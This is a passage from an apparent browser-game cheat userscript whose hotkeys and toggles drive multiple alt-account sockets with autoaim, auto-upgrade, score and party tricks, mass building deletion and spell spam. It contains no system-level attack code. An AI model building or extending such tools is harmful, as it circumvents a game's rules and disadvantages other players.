            this.getElement("X24")[0].innerText = `${this.scripts.autoRefiller ? "Disable" : "Enable"} Auto Refiller`;
            this.setElementToggleTo(this.scripts.autoRefiller, "X24");
        }
        this.getElement("X25")[0].onclick = () => {
            this.scripts.ahrc.toggle();
            this.getElement("X25")[0].innerText = `${this.scripts.ahrc.enabled() ? "Disable" : "Enable"} AHRC`;
            this.setElementToggleTo(this.scripts.ahrc.enabled(), "X25");
        }
        this.getElement("X26")[0].onclick = () => {
            this.scripts.sbt.enabled = !this.scripts.sbt.enabled;
            this.getElement("X26")[0].innerText = `${this.scripts.sbt.enabled ? "Disable" : "Enable"} Score Block Trick`;
            this.setElementToggleTo(this.scripts.sbt.enabled, "X26");
        }
        this.getElement("Y1")[0].onclick = () => {
            this.session.arf = !this.session.arf;
            if (this.session.arf) {
                user.connectedToId && user.sendMessage(`esrf,  ;${user.activeSessions[user.connectedToId].serverId},  ;${this.getElement("dropdown")[1].value == "" ? "." : this.getElement("dropdown")[1].value}`);
                this.getElement("Y1")[0].innerText = "Autorefiller On";
            } else {
                user.connectedToId && user.sendMessage(`dsrf,  ;${user.activeSessions[user.connectedToId].serverId},  ;${this.getElement("dropdown")[1].value == "" ? "." : this.getElement("dropdown")[1].value}`);
                this.getElement("Y1")[0].innerText = "Autorefiller Off";
            }
            this.setElementToggleTo(this.session.arf, "Y1");
        }
        this.getElement("Y2")[0].onclick = () => {
            this.session.prf = !this.session.prf;
            if (this.session.prf) {
                user.connectedToId && user.sendMessage(`eafp,  ;${user.activeSessions[user.connectedToId].serverId}`);
                this.getElement("Y2")[0].innerText = "Partyrefiller On";
            } else {
                user.connectedToId && user.sendMessage(`dafp,  ;${user.activeSessions[user.connectedToId].serverId}`);
                this.getElement("Y2")[0].innerText = "Partyrefiller Off";
            }
            this.setElementToggleTo(this.session.prf, "Y2");
        }
        this.getElement("Y3")[0].onclick = () => {
            this.session.ab = !this.session.ab;
            if (this.session.ab) {
                user.connectedToId && user.sendMessage("eab");
                this.getElement("Y3")[0].innerText = "Autobuild On";
            } else {
                user.connectedToId && user.sendMessage("dab");
                this.getElement("Y3")[0].innerText = "Autobuild Off";
            }
            this.setElementToggleTo(this.session.ab, "Y3");
        }
        this.getElement("Y4")[0].onclick = () => {
            this.session.au = !this.session.au;
            if (this.session.au) {
                user.connectedToId && user.sendMessage("eau");
                this.getElement("Y4")[0].innerText = "Autoupgrade On";
            } else {
                user.connectedToId && user.sendMessage("dau");
                this.getElement("Y4")[0].innerText = "Autoupgrade Off";
            }
            this.setElementToggleTo(this.session.au, "Y4");
        }
        this.getElement("Y5")[0].onclick = () => {
            this.session.atb = !this.session.atb;
            if (this.session.atb) {
                user.connectedToId && user.sendMessage("eatb");
                this.getElement("Y5")[0].innerText = "Autobow On";
            } else {
                user.connectedToId && user.sendMessage("datb");
                this.getElement("Y5")[0].innerText = "Autobow Off";
            }
            this.setElementToggleTo(this.session.atb, "Y5");
        }
        this.getElement("Y6")[0].onclick = () => {
            this.session.aa = !this.session.aa;
            if (this.session.aa) {
                user.connectedToId && user.sendMessage("eaa,  ;0,  ;359");
                this.getElement("Y6")[0].innerText = "Autoaim On";
            } else {
                user.connectedToId && user.sendMessage("daa");
                this.getElement("Y6")[0].innerText = "Autoaim Off";
            }
            this.setElementToggleTo(this.session.aa, "Y6");
        }
        this.getElement("Y7")[0].onclick = () => {
            this.session.apr = !this.session.apr;
            if (this.session.apr) {
                user.connectedToId && user.sendMessage("eapr");
                this.getElement("Y7")[0].innerText = "Autopetrevive On";
            } else {
                user.connectedToId && user.sendMessage("dapr");
                this.getElement("Y7")[0].innerText = "Autopetrevive Off";
            }
            this.setElementToggleTo(this.session.apr, "Y7");
        }
        this.getElement("Y8")[0].onclick = () => {
            this.session.ape = !this.session.ape;
            if (this.session.ape) {
                user.connectedToId && user.sendMessage("eape");
                this.getElement("Y8")[0].innerText = "Autopetevolve On";
            } else {
                user.connectedToId && user.sendMessage("dape");
                this.getElement("Y8")[0].innerText = "Autopetevolve Off";
            }
            this.setElementToggleTo(this.session.ape, "Y8");
        }
        this.getElement("Y9")[0].onclick = () => {
            this.session.ahrc = !this.session.ahrc;
            if (this.session.ahrc) {
                user.connectedToId && user.sendMessage("eahrc");
                this.getElement("Y9")[0].innerText = "AHRC On";
            } else {
                user.connectedToId && user.sendMessage("dahrc");
                this.getElement("Y9")[0].innerText = "AHRC Off";
            }
            this.setElementToggleTo(this.session.ahrc, "Y9");
        }
        this.getElement("Y10")[0].onclick = () => {
            this.session.pt = !this.session.pt;
            if (this.session.pt) {
                user.connectedToId && user.sendMessage("ept");
                this.getElement("Y10")[0].innerText = "Playertrick On";
            } else {
                user.connectedToId && user.sendMessage("dpt");
                this.getElement("Y10")[0].innerText = "Playertrick Off";
            }
            this.setElementToggleTo(this.session.pt, "Y10");
        }
        this.getElement("Y11")[0].onclick = () => {
            this.session.rpt = !this.session.rpt;
            if (this.session.rpt) {
                user.connectedToId && user.sendMessage("erpt");
                this.getElement("Y11")[0].innerText = "Reverseplayertrick On";
            } else {
                user.connectedToId && user.sendMessage("drpt");
                this.getElement("Y11")[0].innerText = "Reverseplayertrick Off";
            }
            this.setElementToggleTo(this.session.rpt, "Y11");
        }
        this.getElement("Y12")[0].onclick = () => {
            this.session.at = !this.session.at;
            if (this.session.at) {
                user.connectedToId && user.sendMessage("eamt");
                this.getElement("Y12")[0].innerText = "Autotimeout On";
            } else {
                user.connectedToId && user.sendMessage("damt");
                this.getElement("Y12")[0].innerText = "Autotimeout Off";
            }
            this.setElementToggleTo(this.session.at, "Y12");
        }
        this.getElement("Y13")[0].onclick = () => {
            this.session.uth = !this.session.uth;
            if (this.session.uth) {
                user.connectedToId && user.sendMessage("euth,  ;25,  ;false");
                this.getElement("Y13")[0].innerText = "Upgradetowerhealth On";
            } else {
                user.connectedToId && user.sendMessage("duth");
                this.getElement("Y13")[0].innerText = "Upgradetowerhealth Off";
            }
            this.setElementToggleTo(this.session.uth, "Y13");
        }
        this.getElement("Y14")[0].onclick = () => {
            this.session.hth = !this.session.hth;
            if (this.session.hth) {
                user.connectedToId && user.sendMessage("ehth,  ;30");
                this.getElement("Y14")[0].innerText = "Healtowerhealth On";
            } else {
                user.connectedToId && user.sendMessage("dhth");
                this.getElement("Y14")[0].innerText = "Healtowerhealth Off";
            }
            this.setElementToggleTo(this.session.hth, "Y14");
        }
        this.getElement("Y15")[0].onclick = () => {
            this.session.ua = !this.session.ua;
            if (this.session.ua) {
                user.connectedToId && user.sendMessage("eua");
                this.getElement("Y15")[0].innerText = "Upgradeall On";
            } else {
                user.connectedToId && user.sendMessage("dua");
                this.getElement("Y15")[0].innerText = "Upgradeall Off";
            }
            this.setElementToggleTo(this.session.ua, "Y15");
        }
        this.getElement("Y16")[0].onclick = () => {
            this.session.sa = !this.session.sa;
            if (this.session.sa) {
                user.connectedToId && user.sendMessage("esa");
                this.getElement("Y16")[0].innerText = "Sellall On";
            } else {
                user.connectedToId && user.sendMessage("dsa");
                this.getElement("Y16")[0].innerText = "Sellall Off";
            }
            this.setElementToggleTo(this.session.sa, "Y16");
        }
        this.getElement("Y17")[0].onclick = () => {
            this.session.sbt = !this.session.sbt;
            if (this.session.sbt) {
                user.connectedToId && user.sendMessage(`esbt,  ;102,  ;107`);
                this.getElement("Y17")[0].innerText = "Scoreblocktrick On";
            } else {
                user.connectedToId && user.sendMessage("dsbt");
                this.getElement("Y17")[0].innerText = "Scoreblocktrick Off";
            }
            this.setElementToggleTo(this.session.sbt, "Y17");
        }
        this.getElement("Y18")[0].onclick = () => {
            this.session.mpt = !this.session.mpt;
            if (this.session.mpt) {
                user.connectedToId && user.sendMessage(`empt,  ;${game.ui.playerPartyShareKey},  ;putpartysharekeyhera,  ;putpartysharekeyherb,  ;putpartysharekeyherc`);
                this.getElement("Y18")[0].innerText = "Multipartytrick On";
            } else {
                user.connectedToId && user.sendMessage("dmpt");
                this.getElement("Y18")[0].innerText = "Multipartytrick Off";
            }
            this.setElementToggleTo(this.session.mpt, "Y18");
        }
        this.getElement("Z1")[0].onclick = () => {
            new Alt();
        }
        this.getElement("Z2")[0].onclick = () => {
            this.session.mb = !this.session.mb;
            if (this.session.mb) {
                if (user.connectedToId) {
                    setTimeout(() => {
                        Object.keys(allSessions).find(session => allSessions[session].uid == window.sessionUid && user.sendMessage(`uncontrolsession,  ;${session}`));
                    }, 1000);
                    user.sendMessage("emb");
                }
                this.getElement("Z2")[0].innerText = "Disable Session Multibox";
            } else {
                if (user.connectedToId) {
                    user.sendMessage("dmb");
                    setTimeout(() => {
                        Object.values(document.getElementsByClassName("hud-map-player")).forEach(e => {
                            e.dataset.index == 6 && e.remove();
                        });
                    }, 1000);
                }
                this.getElement("Z2")[0].innerText = "Enable Session Multibox";
            }
            this.setElementToggleTo(this.session.mb, "Z2");
        }
        this.getElement("Z3")[0].onclick = () => {
            this.scripts.socketFollowMouse = !this.scripts.socketFollowMouse;
            this.scripts.socketFollowMouse ? this.getElement("Z3")[0].innerText = "Disable Regular Mousemove" : this.getElement("Z3")[0].innerText = "Enable Regular Mousemove";
            this.setElementToggleTo(this.scripts.socketFollowMouse, "Z3");
        }
        this.getElement("Z4")[0].onclick = () => {
            this.session.mm = !this.session.mm;
            if (this.session.mm) {
                user.connectedToId && user.sendMessage("mousemoveon");
                this.getElement("Z4")[0].innerText = "Disable Session Mousemove";
            } else {
                user.connectedToId && user.sendMessage("mousemoveoff");
                this.getElement("Z4")[0].innerText = "Enable Session Mousemove";
            }
            this.setElementToggleTo(this.session.mm, "Z4");
        }
        this.getElement("Z5")[0].onclick = () => {
            reversedYaw = !reversedYaw;
            reversedYaw ? this.getElement("Z5")[0].innerText = "Disable Regular Alt Scatter" : this.getElement("Z5")[0].innerText = "Enable Regular Alt Scatter";
            this.setElementToggleTo(reversedYaw, "Z5");
        }
        this.getElement("Z6")[0].onclick = () => {
            this.session.sc = !this.session.sc;
            user.connectedToId && user.sendMessage("scatteralts");
            this.session.sc ? this.getElement("Z6")[0].innerText = "Disable Session Alt Scatter" : this.getElement("Z6")[0].innerText = "Enable Session Alt Scatter";
            this.setElementToggleTo(this.session.sc, "Z6");
        }
        this.getElement("Z7")[0].onclick = () => {
            this.scripts.autoaltjoin = !this.scripts.autoaltjoin;
            this.scripts.autoaltjoin ? this.getElement("Z7")[0].innerText = "Disable Regular Autoaltjoin" : this.getElement("Z7")[0].innerText = "Enable Regular Autoaltjoin";
            this.setElementToggleTo(this.scripts.autoaltjoin, "Z7");
        }
        this.getElement("Z8")[0].onclick = () => {
            this.session.aaj = !this.session.aaj;
            if (this.session.aaj) {
                user.connectedToId && user.sendMessage("eaaj");
                this.getElement("Z8")[0].innerText = "Disable Session Autoaltjoin";
            } else {
                user.connectedToId && user.sendMessage("daaj");
                this.getElement("Z8")[0].innerText = "Enable Session Autoaltjoin";
            }
            this.setElementToggleTo(this.session.aaj, "Z8");
        }
        this.getElement("Z9")[0].onclick = () => {
            autotier4spear = !autotier4spear;
            autotier4spear ? this.getElement("Z9")[0].innerText = "Disable Regular Autospear" : this.getElement("Z9")[0].innerText = "Enable Regular Autospear";
            this.setElementToggleTo(autotier4spear, "Z9");
        }
        this.getElement("Z10")[0].onclick = () => {
            this.session.as = !this.session.as;
            if (this.session.as) {
                user.connectedToId && user.sendMessage("eas,  ;4");
                this.getElement("Z10")[0].innerText = "Disable Session Autospear";
            } else {
                user.connectedToId && user.sendMessage("das");
                this.getElement("Z10")[0].innerText = "Enable Session Autospear";
            }
            this.setElementToggleTo(this.session.as, "Z10");
        }
        user.connectedToId && user.sendMessage("getsettings");
        document.addEventListener('keydown', e => {
            if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                switch (e.code) {
                    case "KeyQ":
                        Object.values(sockets).forEach(e => {
                            !e.thisWeapon && (e.thisWeapon = 'Pickaxe');
                            var nextWeapon = 'Pickaxe';
                            var weaponOrder = ['Pickaxe', 'Spear', 'Bow', 'Bomb'];
                            var foundCurrent = false;
                            for (var i in weaponOrder) {
                                if (foundCurrent) {
                                    if (e.inventory[weaponOrder[i]]) {
                                        nextWeapon = weaponOrder[i];
                                        break;
                                    }
                                } else if (weaponOrder[i] == e.thisWeapon) {
                                    foundCurrent = true;
                                }
                            }
                            e.sendPacket(9, {name: 'EquipItem', itemName: nextWeapon, tier: e.inventory[nextWeapon].tier});
                            e.thisWeapon = nextWeapon;
                            e.inventory[e.thisWeapon] && e.sendPacket(9, {name: 'EquipItem', itemName: e.thisWeapon, tier: e.inventory[e.thisWeapon].tier});
                        })
                        user.connectedToId && user.sendMessage("cycleweapon");
                        break;
                    case "Backslash":
                        script.scripts.socketFreezeMouse = !script.scripts.socketFreezeMouse;
                        user.connectedToId && (sessionMouseMove = !sessionMouseMove);
                        break;
                    case "KeyH":
                        setTimeout(() => {
                            Object.keys(sockets).forEach(ii => {
                                sockets[ii].sendPacket(9, {name: 'LeaveParty'});
                            })
                        }, 100);
                        user.connectedToId && user.sendMessage("leaveall");
                        break;
                    case "KeyJ":
                        for (let ii = 1; ii < 4; ii++) {
                            sockets[ii] && sockets[ii].sendPacket(9, {name: 'JoinPartyByShareKey', partyShareKey: game.ui.playerPartyShareKey});
                        }
                        user.connectedToId && user.sendMessage("joinall");
                        break;
                    case "Space":
                        if (script.scripts.socketMouseDown) {
                            Object.keys(sockets).forEach(ii => {
                                setTimeout(() => {
                                    sockets[ii].sendPacket(3, {space: 0});
                                    sockets[ii].sendPacket(3, {space: 1});
                                }, 100 * sockets[ii].hitDelay);
                            })
                        }
                        user.connectedToId && user.sendMessage("space");
                        break;
                    case "KeyR":
                        if (game.ui.components.BuildingOverlay.buildingUid) {
                            if (game.ui.components.BuildingOverlay.shouldUpgradeAll) {
                                for (let i in game.ui.buildings) {
                                    if (game.ui.buildings[i].type == game.ui.components.BuildingOverlay.buildingId && game.ui.buildings[i].tier == game.ui.components.BuildingOverlay.buildingTier) {
                                        Object.keys(sockets).forEach(ii => {
                                            sockets[ii].sendPacket(9, {name: "UpgradeBuilding", uid: game.ui.buildings[i].uid});
                                        })
                                    }
                                }
                            } else {
                                Object.keys(sockets).forEach(ii => {
                                    sockets[ii].sendPacket(9, {name: "UpgradeBuilding", uid: game.ui.components.BuildingOverlay.buildingUid})
                                })
                            }
                        }
                        break;
                    case "KeyY":
                        if (game.ui.components.BuildingOverlay.buildingUid && game.ui.components.BuildingOverlay.buildingId !== "GoldStash") {
                            if (game.ui.components.BuildingOverlay.shouldUpgradeAll) {
                                for (let i in game.ui.buildings) {
                                    if (game.ui.buildings[i].type == game.ui.components.BuildingOverlay.buildingId && game.ui.buildings[i].tier == game.ui.components.BuildingOverlay.buildingTier) {
                                        Object.keys(sockets).forEach(ii => {
                                            sockets[ii].sendPacket(9, {name: "DeleteBuilding", uid: game.ui.buildings[i].uid})
                                        })
                                    }
                                }
                            } else {
                                Object.keys(sockets).forEach(ii => {
                                    sockets[ii].sendPacket(9, {name: "DeleteBuilding", uid: game.ui.components.BuildingOverlay.buildingUid})
                                })
                            }
                        }
                        break;
                    case "KeyV":
                        Object.keys(sockets).forEach(ii => {
                            if (sockets[ii].myPet) {
                                sockets[ii].sendPacket(9, {name: "DeleteBuilding", uid: sockets[ii].myPet.uid || 0});
                            }
                        })
                        user.connectedToId && user.sendMessage("sellpets");
                        break;
                        case "BracketRight":
                            console.log("BracketRight key pressed, iterating through sockets...");
                            Object.keys(sockets).forEach(ii => {
                                const socket = sockets[ii];
                                console.log(`Processing socket [${ii}]`, socket);
                        
                                if (!socket.gs) {
                                    console.log(`Socket [${ii}] does not have 'gs', preparing to send packet.`);
                                    const partyShareKey = socket.psk?.response?.partyShareKey || "";
                                    console.log(`Socket [${ii}] partyShareKey:`, partyShareKey);
                        
                                    this.sendPacket(9, {name: "JoinPartyByShareKey", partyShareKey});
                                    console.log(`Packet sent for socket [${ii}].`);
                                } else {
                                    console.log(`Socket [${ii}] has 'gs', skipping packet.`);
                                }
                            });
                            break;                        
                    case "KeyN":
                        Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "PetRevive", tier: 1})
                            sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "PetRevive", tier: 1})
                        })
                        user.connectedToId && user.sendMessage("revivepets");
                        break;
                    case "KeyW":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {up: 1, down: 0});
                        })
                        user.connectedToId && user.sendMessage("presskeyw");
                        break;
                    case "KeyD":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {right: 1, left: 0});
                        })
                        user.connectedToId && user.sendMessage("presskeyd");
                        break;
                    case "KeyS":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {down: 1, up: 0});
                        })
                        user.connectedToId && user.sendMessage("presskeys");
                        break;
                    case "KeyA":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {left: 1, right: 0});
                        })
                        user.connectedToId && user.sendMessage("presskeya");
                        break;
                }
            }
        })
        document.addEventListener('keyup', e => {
            if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                switch (e.code) {
                    case "KeyW":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {up: 0});
                        })
                        break;
                    case "KeyD":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {right: 0});
                        })
                        break;
                    case "KeyS":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {down: 0});
                        })
                        break;
                    case "KeyA":
                        script.scripts.wasd && Object.keys(sockets).forEach(ii => {
                            sockets[ii].sendPacket(3, {left: 0});
                        })
                        break;
                }
            }
        })
        this.getElement("hud")[0].addEventListener("mousedown", function(e) {
            if (script.scripts.socketMouseDown) {
                if (!e.button) {
                    Object.keys(sockets).forEach(ii => {
                        sockets[ii].sendPacket(3, {mouseDown: sockets[ii].aimingYaw});
                    })
                    user.connectedToId && user.sendMessage("mousedown");
                }
            }
        });
        this.getElement("hud")[0].addEventListener("mouseup", function(e) {
            if (script.scripts.socketMouseDown) {
                if (!e.button) {
                    Object.keys(sockets).forEach(ii => {
                        sockets[ii].sendPacket(3, {mouseUp: 1});
                    })
                    user.connectedToId && user.sendMessage("mouseup");
                }
            }
        });
        this.getElement("hud-shop-item")[0].addEventListener('click', function() {
            Object.keys(sockets).forEach(ii => {
                sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "Pickaxe", tier: sockets[ii].inventory.Pickaxe.tier + 1});
            })
            user.connectedToId && user.sendMessage("buypickaxe");
        });
        this.getElement("hud-shop-item")[1].addEventListener('click', function() {
            Object.keys(sockets).forEach(ii => {
                sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "Spear", tier: sockets[ii].inventory.Spear ? sockets[ii].inventory.Spear.tier + 1 : 1});
            })
            user.connectedToId && user.sendMessage("buyspear");
        });
        this.getElement("hud-shop-item")[2].addEventListener('click', function() {
            Object.keys(sockets).forEach(ii => {
                sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "Bow", tier: sockets[ii].inventory.Bow ? sockets[ii].inventory.Bow.tier + 1 : 1});
            })
            user.connectedToId && user.sendMessage("buybow");
        });
        this.getElement("hud-shop-item")[3].addEventListener('click', function() {
            Object.keys(sockets).forEach(ii => {
                sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "Bomb", tier: sockets[ii].inventory.Bomb ? sockets[ii].inventory.Bomb.tier + 1 : 1});
            })
            user.connectedToId && user.sendMessage("buybomb");
        });
        this.getElement("hud-shop-item")[4].addEventListener('click', function() {
            Object.keys(sockets).forEach(ii => {
                sockets[ii].sendPacket(9, {name: "BuyItem", itemName: "ZombieShield", tier: sockets[ii].inventory.ZombieShield ? sockets[ii].inventory.ZombieShield.tier + 1 : 1});
            })
            user.connectedToId && user.sendMessage("buyshield");
        });
        this.getElement("hud-toolbar-item")[0].addEventListener('mouseup', function(e) {
            if (!e.button) {
                window.thisWeapon = "Pickaxe";
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "Pickaxe", tier: sockets[ii].inventory.Pickaxe.tier});
                    sockets[ii].thisWeapon = "Pickaxe";
                })
                user.connectedToId && user.sendMessage("equippickaxe");
            }
        });
        this.getElement("hud-toolbar-item")[1].addEventListener('mouseup', function(e) {
            if (!e.button) {
                window.thisWeapon = "Spear";
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].inventory.Spear && (sockets[ii].thisWeapon = "Spear") && sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "Spear", tier: sockets[ii].inventory.Spear.tier});
                })
                user.connectedToId && user.sendMessage("equipspear");
            }
        });
        this.getElement("hud-toolbar-item")[2].addEventListener('mouseup', function(e) {
            if (!e.button) {
                window.thisWeapon = "Bow";
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].inventory.Bow && (sockets[ii].thisWeapon = "Bow") && sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "Bow", tier: sockets[ii].inventory.Bow.tier});
                })
                user.connectedToId && user.sendMessage("equipbow");
            }
        });
        this.getElement("hud-toolbar-item")[3].addEventListener('mouseup', function(e) {
            if (!e.button) {
                window.thisWeapon = "Bomb";
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].inventory.Bomb && (sockets[ii].thisWeapon = "Bomb") && sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "Bomb", tier: sockets[ii].inventory.Bomb.tier});
                })
                user.connectedToId && user.sendMessage("equipbomb");
            }
        });
        this.getElement("hud-toolbar-item")[4].addEventListener('mouseup', function(e) {
            if (!e.button) {
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "HealthPotion", tier: 1});
                })
                user.connectedToId && user.sendMessage("equiphealthpotion");
            }
        });
        this.getElement("hud-toolbar-item")[5].addEventListener('mouseup', function(e) {
            if (!e.button) {
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].sendPacket(9, {name: "EquipItem", itemName: "PetHealthPotion", tier: 1});
                })
                user.connectedToId && user.sendMessage("equippethealthpotion");
            }
        });
        this.getElement("hud-toolbar-item")[6].addEventListener("mouseup", function(e) {
            if (!e.button) {
                Object.keys(sockets).forEach(ii => {
                    sockets[ii].sendPacket(9, {name: "RecallPet"});
                    sockets[ii].automove = !sockets[ii].automove;
                    if (sockets[ii].automove) {
                        window.move = true;
                    } else {
                        window.move = false;
                    }
                })
                user.connectedToId && user.sendMessage("recallpet");
            }
        });
        this.autocleartgl = () => {
            autoclearmessages = !autoclearmessages;
        }
        this.autobowtgl = () => {
            this.scripts.autobow = !this.scripts.autobow;
        }
        this.getgetrss = () => {
            showplayersinfo = !showplayersinfo;
        }
        this.upgradealltgl = () => {
            this.scripts.autoupgrade = !this.scripts.autoupgrade;
        }
        this.autorevivepets = () => {
            if (this.scripts.autoRevivePets && window.activated) {
                this.sendPacket(9, {name: "BuyItem", itemName: "PetRevive", tier: 1});
                this.sendPacket(9, {name: "EquipItem", itemName: "PetRevive", tier: 1});
            }
        }
        document.addEventListener("keydown", (e) => {
            if (e.repeat) return;
            if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                switch (e.code) {
                    case "KeyX":
                        script.upgradealltgl();
                        game.ui.components.PopupOverlay.showHint(`Auto Upgrade ${script.scripts.autoupgrade ? "On" : "Off"}! ${e.code}.`);
                        break;
                    case "KeyN":
                        script.autorevivepets();
                        Object.keys(sockets).forEach(i => {
                            sockets[i].autoRevivePets = script.scripts.autoRevivePets;
                        })
                        game.ui.components.PopupOverlay.showHint(`Auto Revive Pets ${script.scripts.autoRevivePets ? "On" : "Off"}! ${e.code}.`);
                        break;
                    case "KeyM":
                        this.sendPacket(9, {name: "EquipItem", itemName: "PetCARL", tier: myPet.tier || 1});
                        Object.keys(sockets).forEach(i => {
                            sockets[i].sendPacket(9, {name: "EquipItem", itemName: "PetCARL", tier: sockets[i].myPet.tier || 1});
                        })
                        game.ui.components.PopupOverlay.showHint(`PetCARL Equipped! ${e.code}.`);
                        user.connectedToId && user.sendMessage("equippets");
                        break;
                    case "KeyV":
                        if (myPet) {
                            this.sendPacket(9, {name: "DeleteBuilding", uid: myPet.uid || 1});
                            game.ui.components.PopupOverlay.showHint(`Sold Pet! ${e.code}.`);
                        } else {
                            game.ui.components.PopupOverlay.showHint(`No pet to sell! ${e.code}.`);
                        }
                        break;
                    case "Minus":
                        game.ui.components.PlacementOverlay.startPlacing("GoldStash");
                        break;
                    case "KeyK":
                        script.autocleartgl();
                        game.ui.components.PopupOverlay.showHint(`Auto Clear Messages ${autoclearmessages ? "On" : "Off"}! ${e.code}.`);
                        break;
                    case "KeyZ":
                        script.autobowtgl();
                        game.ui.components.PopupOverlay.showHint(`Auto Bow ${script.scripts.autobow ? "On" : "Off"}! ${e.code}.`);
                        break;
                    case "KeyC":
                        if (should9x9Walls) {
                            should9x9Walls = false;
                            game.ui.getComponent("PopupOverlay").showHint('9x9 Walls Off', 1000);
                        } else {
                            should9x9Walls = true;
                            game.ui.getComponent("PopupOverlay").showHint('9x9 Walls On', 1000);
                        }
                        break;
                    case "Backquote":
                        script.getgetrss();
                        game.ui.components.PopupOverlay.showHint(`Show Player Info ${script.scripts.showplayersinfo ? "Enabled" : "Disabled"}! ${e.code}.`);
                        break;
                    case "BracketLeft":
                        this.sendPacket(9, {name: "LeaveParty"});
                        game.ui.components.PopupOverlay.showHint(`Left Party! ${e.code}.`);
                        break;
                    case "Slash":
                        if (!script.scripts.socketFollowMouse) {
                            script.scripts.isallowedtofollow = false;
                            script.scripts.socketRoundPlayer = false;
                            script.scripts.socketFollowMouse = true;
                            Object.keys(sockets).forEach(i => {
                                sockets[i].playerFollower = false;
                                sockets[i].aiming = false;
                                sockets[i].sendPacket(3, {mouseUp: 1});
                            })
                            user.connectedToId && user.sendMessage("mousemoveon");
                        } else {
                            script.scripts.socketFollowMouse = false;
                            Object.keys(sockets).forEach(i => {
                                sockets[i].playerFollower = false;
                                sockets[i].aiming = false;
                                sockets[i].sendPacket(3, {mouseUp: 1});
                                sockets[i].sendPacket(3, {down: 0, left: 0, up: 0, right: 0})
                                sockets[i].a77 = null;
                                sockets[i].a77r = null;
                            })
                            user.connectedToId && user.sendMessage("mousemoveoff");
                        }
                        break;
                    case "Semicolon":
                        script.scripts.wasd = !script.scripts.wasd;
                        break;
                    case "Period":
                        script.scripts.altautohit = !script.scripts.altautohit;
                        if (script.scripts.altautohit) {
                            game.ui.components.PopupOverlay.showHint('Alt Auto Hit Enabled', 1000);
                            script.altautohitInterval = setInterval(() => {
                                let nearestAltMouse = null;
                                let minDistance = Infinity;
                                for (let socket of Object.values(sockets)) {
                                    let distance = measureDistance(socket.mouse, socket.myPlayer.position);
                                    if (distance < minDistance) {
                                        minDistance = distance;
                                        nearestAltMouse = socket;
                                    }
                                }
                                if (nearestAltMouse) {
                                    for (let socket of Object.values(sockets)) {
                                        if (socket !== nearestAltMouse) {
                                            socket.sendPacket(3, { mouseUp: 1 });
                                        }
                                    }
                                    nearestAltMouse.sendPacket(3, { mouseDown: nearestAltMouse.aimingYaw });
                                }
                            }, 1000);
                        } else {
                            game.ui.components.PopupOverlay.showHint('Alt Auto Hit Disabled', 1000);
                            clearInterval(script.altautohitInterval);
                            for (let socket of Object.values(sockets)) {
                                socket.sendPacket(3, { mouseUp: 1 });
                            }
                        }
                        break;
                    case "AltRight":
                        if (!scripts.mousePositionToggle) {
                            scripts.mousePositionToggle = true;
                        } else {
                            scripts.mousePositionToggle = false;
                        }
                        break;
                    case "Equal":
                        scripts.isallowedtofollow = false;
                        scripts.socketRoundPlayer = true;
                        scripts.socketFollowMouse = false;
                        Object.keys(sockets).forEach(i => {
                            sockets[i].playerFollower = false;
                            sockets[i].aiming = false;
                            sockets[i].sendPacket(3, {mouseUp: 1});
                        })
                        break;
                    case "Comma":
                        let encoded = game.network.codec.encode(9, {name: "CastSpell", spell: "HealTowersSpell", x: Math.round(screenToWorld(myMouse.x, myMouse.y).x), y: Math.round(screenToWorld(myMouse.x, myMouse.y).y), tier: 1});
                        game.network.socket.send(encoded);
                        Object.keys(sockets).forEach(i => {
                            sockets[i].ws.send(encoded);
                        })
                        user.connectedToId && user.sendMessage("healspam");
                        break;
                    case "KeyL":
                        new Alt();
                        break;
                        case "KeyI":
                            script.scripts.autoResourceGather = !script.scripts.autoResourceGather;
                            game.ui.components.PopupOverlay.showHint(`Auto Resource Gather ${script.scripts.autoResourceGather ? "Enabled" : "Disabled"}!`);
                        
                            if (script.scripts.autoResourceGather) {
                                Object.keys(sockets).forEach((ii, index) => {
                                    let socket = sockets[ii];
                        
                                    function findNearestEntity(socket, entityType) {
                                        let nearestEntity = null;
                                        let minDistance = Infinity;
                                        const entities = game.world.entities;
                                        entities.forEach(entity => {
                                            if (entity.targetTick && entity.targetTick.model === entityType) {
                                                let distance = Math.sqrt(Math.pow(entity.targetTick.position.x - socket.myPlayer.position.x, 2) + Math.pow(entity.targetTick.position.y - socket.myPlayer.position.y, 2));
                                                if (distance < minDistance) {
                                                    minDistance = distance;
                                                    nearestEntity = entity.targetTick;
                                                }
                                            }
                                        });
                                        return nearestEntity;
                                    }
                        
                                    function moveToEntity(socket, entity, callback) {
                                        let interval = setInterval(() => {
                                            let distance = Math.sqrt(Math.pow(entity.position.x - socket.myPlayer.position.x, 2) + Math.pow(entity.position.y - socket.myPlayer.position.y, 2));
